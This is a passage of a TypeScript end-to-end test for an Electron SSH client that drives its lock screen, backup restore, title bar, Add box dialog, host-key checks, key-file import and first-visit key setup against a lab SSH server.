      // What the first start left in the list is there again: the box, pinned, with its key in the key process.
      if (process.env['SSHAPP_LABBOX']) {
        const kept = ctx.boxes.list;
        const heldNow = await ctx.keys.request('keys');
        check('the boxes are back as they were saved: one box, pinned, with its own key', ctx.boxes.loaded && ctx.boxes.fault === '' && kept.length === 1 && kept[0]!.name === 'lab-box' && kept[0]!.pin !== '' && kept[0]!.places[0]?.name === 'logs' && Array.isArray(heldNow['keys']) && (heldNow['keys'] as Record<string, unknown>[]).length === 1 && (heldNow['keys'] as Record<string, unknown>[])[0]!['publicKey'] === kept[0]!.publicKey, [ctx.boxes.fault, kept.map((b) => [b.name, b.pin !== ''])]);
      }
      // And it is on the screen, not only in main: a list loaded after the window was already drawn, with
      // nothing to redraw it, would leave the app looking like a first start with every box still saved.
      if (process.env['SSHAPP_LABBOX']) {
        const onScreenNow = await text('#bar');
        await clickOn('#boxes');
        await sleep(300);
        const menu = await text('#box-menu');
        check('the window shows the saved box, not an empty first start', menu.includes('lab-box') && !onScreenNow.includes('Add box is the only'), [menu.slice(0, 120), onScreenNow.slice(0, 80)]);
        await clickOn('#boxes');
      }
      const holding = await filesHolding(PASSWORD);
      check('no file the app wrote holds the password, or the wrong one', holding.length === 0 && (await filesHolding('not the password, sorry')).length === 0, holding);

      // A stalled main cannot report itself. The key process times main's beat, so it is the one part that
      // can say main stopped (plan B1, B8 rule 5). Main is stopped here on purpose, which is the only place
      // in this app where anything blocks it; the check that forbids blocking calls covers the app's code.
      const beforeStall = await ctx.keys.request('status');
      const stallFor = 6500;
      const stallUntil = Date.now() + stallFor;
      while (Date.now() < stallUntil) {
        // nothing: main is held here, as a frozen main would be
      }
      const afterStall = await ctx.keys.request('status');
      const stalls = Number(afterStall['mainStalls'] ?? -1);
      const longest = Number(afterStall['mainLongestStallMs'] ?? -1);
      check('the key process saw main stop, and says how long for', Number(beforeStall['mainStalls'] ?? -1) === 0 && stalls === 1 && longest >= stallFor - 500 && longest < stallFor + 4000, [beforeStall['mainStalls'], stalls, longest]);
      canary.close();
      clearTimeout(guard);
      return finish(results.every((r) => r.ok) ? 0 : 1);
    } else if (ctx.mode === 'gate-restore') {
      // A list that cannot be read, and the way back: the copy saved beside it. The list was damaged by the
      // smoke run before this start, so this is the real screen the real fault brings up.
      // The damage is in the sealed contents, so it is found when the password is tried, not before: the lock
      // asks as it always does, and only then can it tell a damaged list from a wrong password.
      check('a start on a damaged list asks for the password as usual', phase() === 'locked' && (await until(() => has('#gate-unlock'), 10_000)), phase());
      check('the password lands in the field whole before it is sent', await typePassword('#pw', PASSWORD), '');
      await pressEnter();
      check('the right password on a damaged list: it is called damaged, not wrong, and no wait is started', (await until(() => phase() === 'damaged', 30_000)) && !ctx.gate.state.wrong && ctx.gate.view().waitMs === 0, [phase(), ctx.gate.state.wrong, ctx.gate.view().waitMs]);
      check('a damaged list: the lock says so, asks for no password, and offers the ways back', (await until(() => has('#gate-damaged'), 5000)) && !(await has('#pw')) && (await has('#gate-previous')) && (await has('#gate-pick-restore')) && ctx.gate.state.hasPrevious, [phase(), ctx.gate.state.detail]);
      check('and it says which fault it is, in words, and that nothing was changed', (await text('#gate-damaged-said')).includes('damaged or was altered') && (await text('#gate-damaged-said')).includes('It was not changed'), await text('#gate-damaged-said'));
      const shots = process.env['SSHAPP_PICTURES'] ?? '';
      if (shots) {
        await js<string>(ctx.shell, `document.fonts.ready.then(() => 'ok')`);
        await sleep(400);
        const size = ctx.win.getContentBounds();
        const made = await takePicture({ win: ctx.win, views: [ctx.shell], file: path.join(shots, `berth-app-dark-${size.width}x${size.height}-list-damaged.png`), strip: `Berth, the app as built   |   dark   |   window ${size.width}x${size.height}   |   a list that cannot be read, and the ways back   |   commit ${process.env['SSHAPP_PICTURE_COMMIT'] ?? ''}`, dist: ctx.dist, harden: ctx.harden });
        check('a picture: a list that cannot be read', made.width > 0, made);
      }
      // A view may type a password; it may not say which file to open. The file is main's own, from the
      // system's chooser or the copy beside the list (plan B2.7).
      const beforeTry = { detail: ctx.gate.state.detail, dropped: ctx.dropped() };
      await js(ctx.shell, `window.shellPort.gateRestore(new TextEncoder().encode('anything at all'))`);
      await sleep(300);
      check('a view cannot open a backup main did not choose: the message is dropped, nothing is tried, nothing is said', phase() === 'damaged' && !ctx.gate.unlocked && ctx.gate.state.restoreFrom === '' && ctx.gate.state.detail === beforeTry.detail && !ctx.gate.state.wrong && ctx.dropped() === beforeTry.dropped + 1, [phase(), ctx.gate.state.detail, ctx.gate.state.wrong, ctx.dropped() - beforeTry.dropped]);
      await clickOn('#gate-previous');
      check('the copy saved before this one can be chosen, and it is named without a path', (await until(() => ctx.gate.state.restoreFrom !== '', 3000)) && (await text('#gate-restore-from')).includes('The copy saved before this one') && (await has('#pw-restore')), [ctx.gate.state.restoreFrom, await text('#gate-restore-from')]);
      await clickOn('#pw-restore');
      await typeKeys('not the password');
      await clickOn('#gate-restore');
      check('a wrong password for the backup is said, and the list is still not open', (await until(() => ctx.gate.state.wrong && phase() === 'damaged', 30_000)) && !ctx.gate.unlocked, [phase(), ctx.gate.state.wrong]);
      // And the wait that comes with it is said on the button, as on the unlock screen: a press inside the
      // wait must never be a press that quietly did nothing.
      check('the wait is counted down on the button', ctx.gate.view().waitMs > 0 && (await until(async () => (await text('#gate-restore')).includes('Wait'), 3000)), [ctx.gate.view().waitMs, await text('#gate-restore')]);
      // The screen holds the button back during the wait; main holds the wait itself, so a view that asks
      // anyway is not looked at either. A try that was looked at would come back wrong and double the wait.
      const waiting = ctx.gate.view().waitMs;
      await js(ctx.shell, `window.shellPort.gateRestore(new TextEncoder().encode('guessing inside the wait'))`);
      await sleep(250);
      check('a password sent inside the wait is not looked at, and does not lengthen the wait', phase() === 'damaged' && ctx.gate.view().waitMs > 0 && ctx.gate.view().waitMs <= waiting, [waiting, ctx.gate.view().waitMs, phase()]);
      await until(() => ctx.gate.view().waitMs === 0, 40_000);
      await js(ctx.shell, `(() => { const f = document.querySelector('#pw-restore'); f.focus(); f.select(); })()`);
      await typeKeys(PASSWORD);
      const typed = await js<number>(ctx.shell, `document.querySelector('#pw-restore').value.length`);
      check('the password is typed into the field, not somewhere else', typed === PASSWORD.length, [typed, PASSWORD.length]);
      await pressEnter();
      check('the right password opens the backup, and it becomes the list', await until(() => phase() === 'unlocked', 30_000), [phase(), ctx.gate.state.detail]);
      check('and the boxes are back, each with its own key', await until(() => ctx.boxes.loaded && ctx.boxes.fault === '' && ctx.boxes.list.length > 0, 5000), [ctx.boxes.fault, ctx.boxes.list.map((b) => b.name)]);
      canary.close();
      clearTimeout(guard);
      return finish(results.every((r) => r.ok) ? 0 : 1);
    } else if (ctx.mode === 'gate-shot') {
      // A picture of the lock as it is, for comparing with the approved one. SSHAPP_GATE_TYPED fills its fields.
      const typed = process.env['SSHAPP_GATE_TYPED'] ?? '';
      await until(async () => (await has('#gate-create')) || (await has('#gate-unlock')) || (await has('#gate-notice')), 5000);
      if (typed && phase() === 'create') {
        await clickOn('#pw-one');
        await typeKeys(typed);
        await clickOn('#pw-two');
        await typeKeys(typed);
      } else if (typed) {
        await clickOn('#pw');
        await typeKeys(typed);
        if (process.env['SSHAPP_GATE_ENTER']) {
          await pressEnter();
          await until(() => ctx.gate.state.wrong, 30_000);
          await sleep(300);
        }
      }
      await js<string>(ctx.shell, `document.fonts.ready.then(() => 'ok')`);
      await sleep(400);
      const file = process.env['SSHAPP_PICTURE'] ?? '';
      const made = await takePicture({ win: ctx.win, views: [ctx.shell], file, strip: process.env['SSHAPP_PICTURE_STRIP'] ?? '', dist: ctx.dist, harden: ctx.harden });
      check(`a picture of the lock (${phase()}): ${made.width} x ${made.height}`, file !== '', made);
      canary.close();
      clearTimeout(guard);
      return finish(results.every((r) => r.ok) ? 0 : 1);
    } else if (ctx.mode !== 'direction' && ctx.mode !== 'engine-must-be-refused') {
      // The other modes are about what comes after the lock: they pass it the short way, with the same password.
      if (phase() === 'create') await ctx.gate.create(Buffer.from(PASSWORD));
      else await ctx.gate.unlock(Buffer.from(PASSWORD));
      check('unlocked', await until(() => phase() === 'unlocked', 30_000), [phase(), ctx.gate.state.detail]);
      await until(() => has('#bar'), 5000);
    }

    // The bar is Berth's title bar: Windows draws none. Its own surface drags the window, what can be pressed
    // in it is pressed and not dragged, and the window's three buttons are at its end and do what they say.
    if (ctx.mode !== 'direction' && ctx.mode !== 'engine-must-be-refused' && (await has('#bar'))) {
      stage = 'the title bar';
      const region = (id: string) => js<string>(ctx.shell, `(getComputedStyle(document.getElementById(${JSON.stringify(id)}))['-webkit-app-region'] ?? getComputedStyle(document.getElementById(${JSON.stringify(id)})).getPropertyValue('-webkit-app-region') ?? '').trim()`);
      const maxBtn = () => js<string>(ctx.shell, `document.getElementById('win-max')?.getAttribute('aria-label') ?? ''`);
      check('the nav carries the window\'s own three buttons', (await has('#win-min')) && (await has('#win-max')) && (await has('#win-close')), '');
      check('and the nav is the title bar: its own surface drags the window', (await region('nav')) === 'drag', await region('nav'));
      check('a button in the nav is pressed, not dragged', (await region('boxes')) === 'no-drag', await region('boxes'));
      // The strip below it must NOT be a region Windows drags by. It was one while it was the title bar, and
      // such a region swallows the press before the page ever sees it: the right button on the strip's empty
      // part would have done nothing on his machine, however well it answered an event a probe dispatched.
      // That is the whole reason this is held rather than left to the layout.
      check('and the tab strip does not drag, or the right button on its empty part would never reach the page',
        (await region('bar')) !== 'drag', await region('bar'));
      const wasMax = ctx.win.isMaximized();
      check('the maximize button offers what the window is not already', (await maxBtn()) === (wasMax ? 'Restore' : 'Maximize'), [await maxBtn(), wasMax]);

      // Whether a window can be maximized at all is the screen's to decide, not Berth's: the test screen the
      // lab runs on under Linux has no window manager, so nothing there maximizes. What is Berth's own, and is
      // checked here wherever the lab runs, is that pressing the button asks the window for the right thing.
      const askedBefore = ctx.windowAsked().length;
      await clickOn('#win-max');
      const asked = await until(() => ctx.windowAsked().length > askedBefore, 4000);
      check('pressing the maximize button asks the window to maximize', asked && ctx.windowAsked()[askedBefore] === 'maximize', ctx.windowAsked());

      // And where the screen does maximize, the window moves and the button turns round with it. Where it does
      // not, that is said here rather than passed over in silence.
      ctx.win.maximize();
      const screenMaximizes = await until(() => ctx.win.isMaximized(), 2000);
      if (!screenMaximizes) {
        check('this screen maximizes no window, so the window moving is not checked here (it is on Windows)', true, 'no window manager');
      } else {
        check('the button turns round when the window is maximized', await until(async () => (await maxBtn()) === 'Restore', 4000), await maxBtn());
        ctx.win.unmaximize();
        check('and back again when it is put back', await until(async () => (await maxBtn()) === 'Maximize', 4000), await maxBtn());
      }
      // Put back as it was, so what follows is measured in the window the rest of the run expects.
      if (wasMax) ctx.win.maximize();
      else ctx.win.unmaximize();
      await until(() => ctx.win.isMaximized() === wasMax, 4000);
    }

    // "boxes-ui": the box screens driven by hand, as they will be used: real clicks and keys into the real
    // dialogs, against the lab's SSH server. SSHAPP_PICTURES=<folder> also pictures each screen on the way.
    if (ctx.mode === 'boxes-ui') {
      const labBin = process.env['SSHAPP_LABBOX'] ?? '';
      const shots = process.env['SSHAPP_PICTURES'] ?? '';
      const commit = process.env['SSHAPP_PICTURE_COMMIT'] ?? '';
      const size = ctx.win.getContentBounds();
      const shot = async (name: string, what: string, bring: Tab | null = null) => {
        // Every screen worth a picture is a screen worth sweeping, so the sweeps run here: the prose on it,
        // the answers it offers and whether it tells a story. They used to run at five moments chosen by hand,
        // which meant a dialog opened anywhere else was never read at all, and a probe over the answers could
        // not fail for a dialog it never saw.
        //
        // The sweep follows the screen and not the picture, so it runs whether or not a picture is being
        // written: the run that guards the merge writes none, and with the sweep behind that gate it read a
        // third of what a run with pictures read, and the floors under it would have had to be a third as
        // strong. Everything above the picture itself therefore happens either way, and the two runs walk the
        // same path.
        if (bring && ctx.shellState().active !== bring.id) {
          await js(ctx.shell, `window.shellPort.cmd({ op: 'select', id: ${bring.id} })`);
          await sleep(200);
        }
        await sleep(350);
        await read(ctx.shell);
        if (!shots) return;
        const front = [...ctx.tabs.values()].find((t) => t.id === ctx.shellState().active);
        const made = await takePicture({ win: ctx.win, views: front ? [front.view, ctx.shell] : [ctx.shell], file: path.join(shots, `berth-app-dark-${size.width}x${size.height}-${name}.png`), strip: `Berth, the app as built   |   dark   |   window ${size.width}x${size.height}   |   ${what}   |   commit ${commit}`, dist: ctx.dist, harden: ctx.harden });
        check(`a picture: ${what}`, made.width > 0, made);
        if (name === 'tab-open') {
          // The picture is the window: in its middle is the tab's terminal, seen through the shell that lies
          // over it. (Until 2026-11-16 the pictures showed black there, and nothing noticed.)
          const png = nativeImage.createFromBuffer(await readFile(path.join(shots, `berth-app-dark-${size.width}x${size.height}-${name}.png`)));
          const at = (Math.floor(png.getSize().height / 2) * png.getSize().width + Math.floor(png.getSize().width / 2)) * 4;
          const px = [...png.toBitmap().subarray(at, at + 3)].reverse().map((v) => v.toString(16).padStart(2, '0')).join('');
          check('the picture shows the tab through the shell: its middle is the terminal\'s own colour', px === '141b21', px);
        }
      };
      const shellOnTop = () => {
        const kids = ctx.win.contentView.children;
        return kids[kids.length - 1] === ctx.shell;
      };
      const moveTo = async (sel: string) => {
        const p = await at(sel);
        if (p) sh.sendInputEvent({ type: 'mouseMove', x: p.x, y: p.y });
        await sleep(120);
        return !!p;
      };
      const selectAll = async () => {
        sh.sendInputEvent({ type: 'keyDown', keyCode: 'A', modifiers: ['control'] });
        sh.sendInputEvent({ type: 'keyUp', keyCode: 'A', modifiers: ['control'] });
        await sleep(60);
      };
      const step = () => js<string>(ctx.shell, `document.getElementById('check')?.dataset.step ?? ''`);
      if (labBin === '') {
        check('a lab box to connect to', false, 'SSHAPP_LABBOX is not set');
      } else {
        const { box: lab, first } = await LabBox.start(labBin);
        const addr = String(first['addr'] ?? '');
        const port = addr.split(':')[1] ?? '';
        const printed = String(first['printed'] ?? '');

        check('a first start with no box shows one thing: Add box', await until(() => has('#first-add'), 5000), '');
        await shot('first-use', 'a first start: no box yet');
        await clickOn('#first-add');
        check('Add box opens, with the shell above the tabs', (await until(() => has('#add-box'), 3000)) && (await until(shellOnTop, 1000)), '');
        // A dialog dims the window behind it but must leave the status line alone: that line is where the app
        // says what it just did, and a dialog is exactly when it is needed. Under the dim it could not be read.
        const overFoot = await js<boolean>(ctx.shell, `(() => { const s = document.querySelector('.scrim'); const f = document.getElementById('status'); if (!s || !f) return true; return Math.round(s.getBoundingClientRect().bottom) > Math.round(f.getBoundingClientRect().top); })()`);
        check('a dialog leaves the status line clear of its dim', !overFoot, overFoot);
        await shot('add-empty', 'Add box, empty');
        // Add with nothing typed: every required field says so, and nothing is asked of main.
        await clickOn('#add-submit');
        check('Add with nothing typed: the first field to fix is named, with how many there are', (await text('#add-to-fix')).includes('Name: needed') && (await text('#add-to-fix')).includes('3 fields to fix') && (await text('#box-name-check')) === 'needed' && ctx.boxes.list.length === 0, await text('#add-to-fix'));
        // A press that is refused must move something, or there is no telling it landed at all. The cursor goes
        // into the first field that needs attention: this is what cost the owner his host field on the first install.
        check('and the cursor is put in the first field to fix, not left where it was', (await js<string>(ctx.shell, `document.activeElement?.id ?? ''`)) === 'box-name', await js<string>(ctx.shell, `document.activeElement?.id ?? ''`));
        // The same with only one field left: the one named is the one still wrong, and the cursor goes to it.
        await clickOn('#box-name');
        await typeKeys('for-a-moment');
        await clickOn('#box-host');
        await typeKeys('127.0.0.1');
        await clickOn('#add-submit');
        check('one field left to fix: it is named on its own, and the cursor is in it', (await text('#add-to-fix')).includes('User: needed') && !(await text('#add-to-fix')).includes('fields to fix') && (await js<string>(ctx.shell, `document.activeElement?.id ?? ''`)) === 'box-user', [await text('#add-to-fix'), await js<string>(ctx.shell, `document.activeElement?.id ?? ''`)]);
        // Put the name and host back to nothing, so what follows types them as it did before.
        for (const id of ['#box-name', '#box-host']) {
          await clickOn(id);
          await selectAll();
          sh.sendInputEvent({ type: 'keyDown', keyCode: 'Backspace' });
          sh.sendInputEvent({ type: 'keyUp', keyCode: 'Backspace' });
          await sleep(80);
        }
        await clickOn('#box-name');
        await typeKeys('lab-box');
        await clickOn('#hue-pick');
        check('the colour is an option in the name field: its colours open under it', await until(() => has('.hue-menu'), 2000), '');
        await shot('add-colour', 'Add box, the colour opened');
        await clickOn('[data-hue="3"]');
        check('a colour picked closes the list', !(await has('.hue-menu')), '');
        await clickOn('#box-host');
        await typeKeys('127.0.0.1');
        await clickOn('#box-port');
        await typeKeys('99999');
        check('each field checks itself as it is typed', (await text('#box-name-check')).includes('free') && (await text('#box-host-check')) === 'an IP address' && (await text('#box-port-check')) === '1 to 65535', [await text('#box-name-check'), await text('#box-port-check')]);
        await selectAll();
        await typeKeys(port);
        await clickOn('#box-user');
        await typeKeys('demo');
        await clickOn('#place-0-name');
        await typeKeys('logs');
        await clickOn('#place-0-folder');
        await typeKeys('/var/log');
        check('a new place row appears under the one filled', await until(() => has('#place-1-name'), 2000), '');
        await shot('add-filled', 'Add box, filled in');
        await clickOn('#add-submit');
        const reached = await until(async () => (await step()) === 'reached', 20_000);
        check('Add box: the box is added in the colour picked, and its check opens at once, asking the box who it is', reached && ctx.boxes.list.length === 1 && ctx.boxes.list[0]?.colour === 3 && !(await has('#add-box')) && shellOnTop(), [await step(), ctx.boxes.list.length]);
        const id = ctx.boxes.list[0]?.id ?? '';
        const shownBefore = await js<string>(ctx.shell, `document.getElementById('check').textContent`);
        check('what the box showed is nowhere on the screen before a paste', !shownBefore.includes('SHA256:') || !printed.split(' ').some((w) => w.startsWith('SHA256:') && shownBefore.includes(w)), '');
        await clickOn('#check-copy');
        const copied = await until(async () => (await clipboard.readText()) === ctx.boxes.block(id), 2000);
        check('Copy puts the exact block on the clipboard', copied && (await clipboard.readText()).includes(ctx.boxes.list[0]!.publicKey), (await clipboard.readText()).slice(0, 60));
        // And the button says it copied. The footer says so too, but the footer is behind this dialog and its
        // dim, so from in here the press looked like nothing at all.
        check('Copy says it copied, on the button itself', await until(async () => (await text('#check-copy')).includes('Copied'), 2000), await text('#check-copy'));
        await shot('check-asked', 'the first-connection check, waiting for the paste');
        await read(ctx.shell);
        // The block holds the command and the button that copies it. The button used to be lifted out of the
        // flow and kept clear by a fixed 92px of padding, which is a guess at its width: pressed, it says
        // "Copied" and is wider than the guess, and it sat across the key in the command. Measured in both
        // states, because the state that was wrong is the one only a press reaches.
        const apart = (): Promise<{ over: number; code: number; btn: string }> => js(ctx.shell, `(() => {
          const c = document.querySelector('.codeblock code'), b = document.getElementById('check-copy');
          if (!c || !b) return { over: -1, code: -1, btn: 'gone' };
          const r = c.getBoundingClientRect(), q = b.getBoundingClientRect();
          return { over: Math.round(Math.min(r.right, q.right) - Math.max(r.left, q.left)), code: Math.round(r.width), btn: (b.textContent || '').trim() };
        })()`);
        await clickOn('#check-copy');
        await until(async () => (await apart()).btn.includes('Copied'), 3000);
        const noOverlap = await apart();
        // "Copied" is the wide state and the one the old padding was too small for, so that is the state held
        // here; the button's own words are held too, so this cannot quietly measure the narrow one instead.
        check('the button that copies the command does not sit on the command once it says Copied',
          noOverlap.btn.includes('Copied') && noOverlap.over <= 0 && noOverlap.code > 200, noOverlap);

        await clickOn('#check-paste');
        await typeKeys('256 SHA256:nB4yE8wQ2oL6cT0vR9mK3jH7gF5dS1aZ8xU4iP6eW2k root@elsewhere (ED25519)');
        const onScreen = await text('#check');
        check('a paste from another box: the dialog turns to a mismatch, what was pasted is shown, no Trust', (await until(async () => (await step()) === 'mismatch', 3000)) && (await has('#check-mismatch')) && !(await has('#check-trust')) && onScreen.includes('nB4yE8wQ'), await step());
        check('and the screen never prints what answered: the kind, and that its fingerprint is withheld', !printed.split(/\s+/).some((w) => w.startsWith('SHA256:') && onScreen.includes(w)) && onScreen.includes('its fingerprint is not shown here'), onScreen.slice(0, 200));
        await shot('check-mismatch', 'the first-connection check, another box answered');
        await clickOn('#check-paste');
        await selectAll();
        await typeKeys(printed.trim());
        check('the box\'s own line: a match, and Trust and connect', (await until(async () => (await step()) === 'match', 3000)) && (await has('#check-trust')), await step());
        await shot('check-match', 'the first-connection check, a match');
        await clickOn('#check-trust');
        check('Trust and connect: the dialog closes, the box is pinned, and a tab opens on it, the tab above the shell again', (await until(() => ctx.boxes.list[0]?.pin !== '' && !shellOnTop() && ctx.shellState().tabs.length === 1, 10_000)) && !(await has('#check')), [ctx.boxes.list[0]?.pin !== '', shellOnTop()]);
        const t1 = [...ctx.tabs.values()][0]!;
        await until(() => t1.engine.link.phase === 'ended', 20_000);
        check('the key is not on the box yet: the tab says the sign-in failed', t1.engine.link.cause === 'sign-in-failed' && (await text(`[data-tab="${t1.id}"]`)).includes('lab-box'), t1.engine.link);
        // A refused key is a stop, not a hiccup: Berth never opens a new session by itself after one, nor
        // after a box shows another identity. Trying again would only be refused again, or asked of a box
        // that may not be the box (plan A3 decision 6).
        const pidAfterRefusal = t1.engine.pid;
        await sleep(1200);
        check('and no new session is opened after a refused key, by itself or on a count', t1.againAt === 0 && t1.engine.pid === pidAfterRefusal && t1.engine.link.cause === 'sign-in-failed' && !(await text('#bar', t1)).includes('A new session opens'), [t1.againAt, t1.engine.pid === pidAfterRefusal, await text('#bar', t1)]);
        ctx.closeTab(t1.id);
        await lab.tell(`accept ${ctx.boxes.list[0]!.publicKey}`);

        // Bringing in a key the person already has (plan O1). This is what lets a box be added without any
        // other program: his boxes already hold his public key, so the private half is the way in, and nothing
        // has to be run on the box first.
        {
          // Real key files, written by the lab box in the format OpenSSH writes, which is what a person's own
          // files are: one plain, one with a passphrase.
          const dir = await mkdtemp(path.join(os.tmpdir(), 'berth-keyfile-'));
          const plain = path.join(dir, 'id_ed25519');
          const locked = path.join(dir, 'id_ed25519_locked');
          const plainSaid = await lab.tell(`keyfile ${plain}`);
          const lockedSaid = await lab.tell(`keyfile ${locked} the file passphrase`);
          check('the lab wrote two key files of the kind a person already has', typeof plainSaid['publicKey'] === 'string' && typeof lockedSaid['publicKey'] === 'string', [plainSaid['error'], lockedSaid['error']]);

          await clickOn('#boxes');
          await until(() => has('#box-menu'), 2000);
          await clickOn('#add-box-open');
          await until(() => has('#add-box'), 3000);
          check('Add box offers a key file, for a box that already holds one of his keys', await has('#key-file-pick'), '');

          // A file with a passphrase: said as that, and nothing is taken until it is given.
          await ctx.chooseKeyFile(locked);
          check('a key file with a passphrase is said to have one, and nothing is taken yet', await until(async () => (await has('#key-passphrase')) && (await text('#key-file-needs')).includes('has a passphrase'), 4000), await text('#key-file-needs'));
          await ctx.keyPassphrase('not the passphrase');
          check('the wrong passphrase is said plainly, and still nothing is taken', await until(async () => (await text('#key-file-needs')).includes('does not open it'), 4000), await text('#key-file-needs'));
          await ctx.keyPassphrase('the file passphrase');
          const opened = await until(async () => has('#key-file-key'), 4000);
          check('the right passphrase opens it, and the screen says which key it is', opened && (await text('#key-file-key')).includes('SHA256:'), await text('#key-file-key'));

          // Add box while the file has not opened: refused, with the reason, and no box is made. Adding with a
          // file that has not opened would be adding a box with no key at all.
          {
            await ctx.keyPassphrase('still not the passphrase');
            await until(async () => (await text('#key-file-needs')).includes('does not open it'), 4000);
            const before = ctx.boxes.list.length;
            await clickOn('#box-name');
            await typeKeys('not-added');
            await clickOn('#box-host');
            await typeKeys('127.0.0.1');
            await clickOn('#box-user');
            await typeKeys('demo');
            await clickOn('#add-submit');
            await sleep(600);
            check('Add box with a key file that has not opened is refused, and no box is made', ctx.boxes.list.length === before && !ctx.boxes.list.some((b) => b.name === 'not-added') && (await has('#add-box')), [ctx.boxes.list.length, before, await text('#add-error')]);
            for (const id of ['#box-name', '#box-host', '#box-user']) {
              await clickOn(id);
              await selectAll();
              sh.sendInputEvent({ type: 'keyDown', keyCode: 'Backspace' });
              sh.sendInputEvent({ type: 'keyUp', keyCode: 'Backspace' });
              await sleep(60);
            }
          }

          // Put it aside: the box would get a key Berth makes, as before.
          await clickOn('#key-file-drop');
          check('the key file can be put aside, and Berth makes one again', await until(async () => (await has('#key-file-pick')) && !(await has('#key-file-key')), 3000), '');

          // The plain file, and a box added with it.
          await ctx.chooseKeyFile(plain);
          const shown = await until(async () => has('#key-file-key'), 4000);
          const fileFingerprint = (await text('#key-file-key')).split(' ').find((w) => w.startsWith('SHA256:')) ?? '';
          check('a key file with no passphrase opens at once and names its key', shown && fileFingerprint !== '', await text('#key-file-key'));
          await shot('add-key-file', 'Add box, with a key file he already has');
          await read(ctx.shell);
          await clickOn('#box-name');
          await typeKeys('own-key-box');
          await clickOn('#box-host');
          await typeKeys('127.0.0.1');
          await clickOn('#box-port');
          await typeKeys(port);
          await clickOn('#box-user');
          await typeKeys('demo');
          await clickOn('#add-submit');
          const brought = await until(() => ctx.boxes.list.some((b) => b.name === 'own-key-box'), 20_000);
          const box = ctx.boxes.list.find((b) => b.name === 'own-key-box');
          const held = await ctx.keys.request('keys');
          const its = Array.isArray(held['keys']) ? (held['keys'] as Record<string, unknown>[]).find((k) => k['box'] === box?.id) : undefined;
          check('the box carries the key from his own file, not one Berth made', brought && box !== undefined && its !== undefined && box!.publicKey === its!['publicKey'] && fingerprintOf(box!.publicKey) === fileFingerprint, [box?.publicKey.slice(0, 40), fileFingerprint, its?.['origin']]);
          check('and the list says that key was brought in, not made here', its?.['origin'] === 'imported', its?.['origin']);
          check('the window says the box was added with his own key', (await text('#status-done')).includes('with your own key'), await text('#status-done'));
          // Nothing of the file is left in main once the box is made.
          check('the key file is let go once the box has it', ctx.shellState().keyFile === null, ctx.shellState().keyFile);

          // And the whole point of it: the box already knows this key, so Berth signs in with it and no block
          // was ever run on the box. The lab box is told to let that key in, as a real box already would.
          await lab.tell(`accept ${String(plainSaid['publicKey'])}`);
          await clickOn('#check-paste');
          await typeKeys(printed.trim());
          const matched2 = await until(async () => (await step()) === 'match', 6000);
          check('a box added with his own key is checked like any other', matched2, await step());
          await clickOn('#check-trust');
          const inWithOwn = await until(() => [...ctx.tabs.values()].some((t) => t.box?.id === box?.id && t.engine.link.phase === 'up'), 25_000);
          check('and Berth signs in to it with that key, having run nothing on the box', inWithOwn, [...ctx.tabs.values()].map((t) => t.engine.link.phase));
          for (const t of [...ctx.tabs.values()].filter((t) => t.box?.id === box?.id)) ctx.closeTab(t.id);
          await lab.tell(`accept ${ctx.boxes.list.find((b) => b.name === 'lab-box')?.publicKey ?? ''}`);
          for (const b of ctx.boxes.list.filter((x) => x.name === 'own-key-box')) await ctx.boxes.remove(b.id);
          await rm(dir, { recursive: true, force: true });
        }

        // The first visit (decision O2): the one screen in this app that ever asks for a box's own password.
        // What a real box does with a real password is proved against real OpenSSH in the engine's own tests
        // (TestOpenSSHFirstVisit). What is proved here is everything on this side of the wire, and above all
        // the order: the box is pinned before the field exists, so a box pretending to be his never sees one.
        {
          const visits: { addr: string; user: string; hostKey: string; password: string; command: string }[] = [];
          let answer: { ok: true; said: string } | { ok: false; cause: string; detail: string } = { ok: true, said: 'SHA256:xxxx root@lab\n' };
          ctx.watchFirstVisits((v) => {
            visits.push(v);
            return answer;
          });
          const add = async (name: string): Promise<string> => {
            // Add box lives in the Boxes menu, so the menu is opened first: pressing what is not on screen is
            // a press that lands on nothing.
            if (!(await has('#add-box-open'))) await clickOn('#boxes');
            await until(() => has('#add-box-open'), 5000);
            await clickOn('#add-box-open');
            await until(() => has('#box-name'), 5000);
            await clickOn('#box-name');
            await typeKeys(name);
            await clickOn('#box-host');
            await typeKeys('127.0.0.1');
            await clickOn('#box-port');
            await typeKeys(port);
            await clickOn('#box-user');
            await typeKeys('demo');
            await clickOn('#add-submit');
            await until(() => has('#check'), 20_000);
            return ctx.boxes.list.find((b) => b.name === name)?.id ?? '';
          };
          // A box that has not been checked cannot be visited at all: the screen is not reachable by asking
          // for it, which is the only way a taken-over window could try.
          const idA = await add('first-visit-box');
          const droppedBefore = ctx.dropped();
          await js(ctx.shell, `window.shellPort.cmd({ op: 'firstVisit', box: ${JSON.stringify(idA)} })`);
          await sleep(400);
          check('a box that has not been checked cannot be visited: the screen does not open', !(await has('#first-visit')) && ctx.shellState().firstVisit === null && visits.length === 0, [await has('#first-visit'), visits.length]);
          // The way in is the check, after a match, with the identity pinned first.
          await clickOn('#check-paste');
          await selectAll();
          await typeKeys(printed.trim());
          await until(() => has('#check-visit'), 10_000);
          await clickOn('#check-visit');
          const opened = await until(() => has('#first-visit'), 15_000);
          const pinnedFirst = ctx.boxes.list.find((b) => b.id === idA)?.pin !== '';
          await shot('first-visit', 'the one screen that ever asks for a box\'s own password, after the box is pinned', null);
          await read(ctx.shell);
          check('the first visit opens only from the check, and only with the box already pinned', opened && pinnedFirst && ctx.shellState().firstVisit?.box === idA, [opened, pinnedFirst]);
          // What is typed goes to main and nowhere else: it is not in the window's state, which is what a
          // picture of this screen holds and what every view is told.
          await clickOn('#first-visit-password');
          await typeKeys('a-password-for-the-box');
          const stateHolds = JSON.stringify(ctx.shellState());
          check('the password is not in the window\'s state, before it is sent or after', !stateHolds.includes('a-password-for-the-box'), stateHolds.length);
          // Sent: main hands the visit the box it pinned, that box's user, and the one block with that box's
          // own key in it. Nothing of this is a view's to choose.
          const theBox = ctx.boxes.list.find((b) => b.id === idA)!;
          await lab.tell(`accept ${theBox.publicKey}`);
          await clickOn('#first-visit-go');
          const went = await until(() => visits.length === 1, 15_000);
          const v = visits[0];
          check('main hands the visit the pinned box, its user, and the one block with that box\'s own key', went && v?.password === 'a-password-for-the-box' && v?.hostKey === theBox.pin && v?.user === 'demo' && v?.command.includes(theBox.publicKey) && v?.command.includes('authorized_keys'), [went, v?.user, v?.hostKey === theBox.pin, v?.command.slice(0, 40)]);
          // It says it worked only if the key really works: a tab is opened and signed in to with the key
          // alone, and only then does the screen say so.
          const said = await until(async () => (await has('#first-visit-done')), 30_000);
